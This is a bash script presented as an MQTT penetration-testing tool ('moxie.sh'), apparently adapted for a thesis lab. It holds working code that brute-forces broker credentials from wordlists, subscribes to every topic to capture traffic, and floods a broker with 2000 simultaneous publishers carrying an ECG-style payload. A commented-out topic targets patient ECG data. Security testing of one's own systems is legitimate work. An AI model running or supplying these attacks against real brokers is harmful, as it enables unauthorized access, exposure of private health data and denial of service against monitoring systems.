#!/bin/bash

# Color variables
green='\033[0;32m'
yellow='\033[1;33m'
blue='\033[0;34m'
bold='\033[1m'
red='\033[0;31m'
cyan='\033[0;36m'
magenta='\033[0;35m'
reset='\033[0m'

verbose=false

# Function to check if MQTT service is accessible
check_mqtt_service() {
    ip=$1
    port=$2
    
    echo -e "${blue}Checking MQTT service on ${cyan}${ip}:${port}${reset}${blue}...${reset}"
    
    # Try without authentication
    mosquitto_pub -h $ip -p $port -t "test" -m "Testing MQTT service" &> /dev/null
    if [ $? -eq 0 ]; then
        echo -e "${green}MQTT service is accessible on ${cyan}${ip}:${port}${reset}${green} without authentication${reset}"
        return 0
    fi

    # If failed, service might require authentication
    echo -e "${yellow}MQTT service on ${cyan}${ip}:${port}${reset}${yellow} requires authentication.${reset}"
    echo -e "${yellow}Try brute-forcing with the ${bold}-b${reset}${yellow} option.${reset}"
    return 1
}

# Function to perform advanced scan using nmap
advanced_scan() {
    ip=$1
    port=$2
    username=$3
    password=$4
    
    echo -e "${blue}Performing advanced scan using ${magenta}nmap${reset}${blue}...${reset}"
    nmap -p $port -sS -sV -sC -A -Pn -vv --script mqtt-subscribe $ip --script-args "username=$3,password=$4"
}

# Function to perform brute-force attack
brute_force_attack() {
    ip=$1
    port=$2

    # Read wordlist paths from user
    username_wordlist=$3
    password_wordlist=$4

    if [ ! -f "$username_wordlist" ] || [ ! -f "$password_wordlist" ]; then
        echo -e "${red}Error: Username or password wordlist file not found.${reset}"
        exit 1
    fi

    echo -e "${blue}Performing brute-force attack on MQTT service...${reset}"
    while IFS= read -r username; do
        while IFS= read -r password; do
            if $verbose; then
                echo -e "${cyan}Trying username: ${yellow}${username}${reset}${cyan} and password: ${yellow}${password}${reset}"
            fi
            mosquitto_pub -h $ip -p $port -t "test" -m "Testing MQTT service" -u "$username" -P "$password" &> /dev/null
            if [ $? -eq 0 ]; then
                echo -e "${green}Successfully accessed MQTT service on ${cyan}${ip}:${port}${reset}${green} with username: ${yellow}${username}${reset}${green} and password: ${yellow}${password}${reset}"
                return 0
            fi
        done < "$password_wordlist"
    done < "$username_wordlist"

    echo -e "${red}Failed to access MQTT service with the provided username and password wordlists.${reset}"
    return 1
}

# Function to check MQTT transactions
check_mqtt_transactions() {
    ip=$1
    port=$2
    username=$3
    password=$4
    duration=$5
    
   # Create a new process group
   set -m
   
   # Launch moxie.sh -t in the new process grouṕ 
    if [ -z "$username" ] && [ -z "$password" ]; then
        echo -e "${cyan}Attempting to connect without authentication...${reset}"
        mosquitto_sub -h $ip -p $port -t "#" -v &
    else
        echo -e "${cyan}Attempting to connect with provided credentials...${reset}"
        mosquitto_sub -h $ip -p $port -t "#" -u "$username" -P "$password" -v --cafile /home/erickjo16/TFM/Environment/mosquitto/certs/ca.crt  &
    fi

   pid=$!
   sleep $duration

   #kill the process group
   kill -- -$pid

    if [ $? -eq 0 ]; then
        echo -e "${green}Successfully listed transactions on ${cyan}${ip}:${port}${reset}"
    else
        echo -e "${yellow}Failed to list transactions. Please check your credentials or try brute-forcing with the ${bold}-b${reset}${yellow} option.${reset}"
    fi
}

# Function to start an DoS ATTACK
dos_attack() {
    ip=$1
    port=$2
    username=$3
    password=$4
    message="{\"ecg_signal\": [0.0, 0.0, 0.0, -0.0, -0.0, 0.00, -0.0, 0.0, -0.0, -00]}"
    #topic="/patients/ward1/bed1/ecg"
    topic="#"
    connections=2000
    delay=0.001

	echo "[*] Starting MQTT DoS attack on $ip:$port with $connections clients..."

for i in $(seq 1 $connections); do
    mosquitto_pub -h "$ip" -p "$port" -t "$topic" -m "$message" -u "$username" -P "$password" -q 0 &
    #sleep "$delay"
done

echo "[*] All clients sent. Wait for broker overload or manually check status."

}


# Function to display tool usage
display_usage() {
    echo -e "${bold}Usage:${reset}"
    echo -e "  ${bold}moxie.sh <option> [ip] [port]${reset}"
    echo
    echo -e "${bold}Options:${reset}"
    echo -e "  ${bold}-c, --check${reset}         Check MQTT service"
    echo -e "  ${bold}-s, --scan${reset}          Perform advanced scan"
    echo -e "  ${bold}-b, --bruteforce${reset}    Conduct brute-force attack"
    echo -e "  ${bold}-t, --transactions${reset}  Check MQTT transactions"
    echo -e "  ${bold}-d, --DoS attack${reset}	 Make a DoS attack"
    echo -e "  ${bold}-h, --help${reset}          Display this help message"
}

# Main function
main() {
    echo -e "${cyan}"
    echo "  ___  __________   _______ _____  "
    echo "  |  \/  |  _  \ \ / /_   _|  ___|"
    echo "  | .  . | | | |\ V /  | | | |__   "
    echo "  | |\/| | | | |/   \  | | |  __|  "
    echo "  | |  | \ \_/ / /^\ \_| |_| |___  "
    echo "  \_|  |_/\___/\/   \/\___/\____/  "
    echo "         The MQTT Pentester    "
    echo "                               "
    echo "         Author: aravind0x7    "
    echo -e "${reset}"

    if [ $# -eq 0 ]; then
        display_usage
        exit 1
    fi

    while [[ $# -gt 0 ]]; do
        case $1 in
            -c|--check)
                if [ $# -ne 3 ]; then
                    echo -e "${red}Error: IP address and port number are required.${reset}"
                    display_usage
                    exit 1
                fi
                check_mqtt_service $2 $3
                exit $?
                ;;
            -s|--scan)
                #if [ $# -ne 5 ]; then
		if [ $# -ne 3 ] && [ $# -ne 5 ]; then
                    echo -e "${red}Error: IP address and port number are required.${reset}"
                    display_usage
                    exit 1
                fi
                advanced_scan $2 $3 $4 $5
                exit $?
                ;;
            -b|--bruteforce)
                if [ $# -ne 5 ]; then
                    echo -e "${red}Error: IP address and port number are required.${reset}"
                    display_usage
                    exit 1
                fi
                brute_force_attack $2 $3 $4 $5
                exit $?
                ;;
            -t|--transactions)
 		if [ $# -ne 4 ] && [ $# -ne 6 ]; then
			echo -e "${red}Error: IP address, port number, username and password (if these were necessary) and duration are required.${reset}"
                    display_usage
                    exit 1
                fi
                check_mqtt_transactions $2 $3 $4 $5 $6
                exit $?
                ;;
	    -d|--dos)
		if [ $# -ne 3 ] && [ $# -ne 5 ]; then
                    echo -e "${red}Error: IP address and port number are required.${reset}"
                    display_usage
                    exit 1
                fi
		dos_attack $2 $3 $4 $5
                exit $?
                ;;
 
            -v|--verbose)
                verbose=true
                ;;
            -h|--help)
                display_usage
                exit 0
                ;;
            *)
                echo -e "${red}Error: Invalid option.${reset}"
                display_usage
                exit 1
                ;;
        esac
        shift
    done
}

# Execute main function with command-line arguments
main "$@"
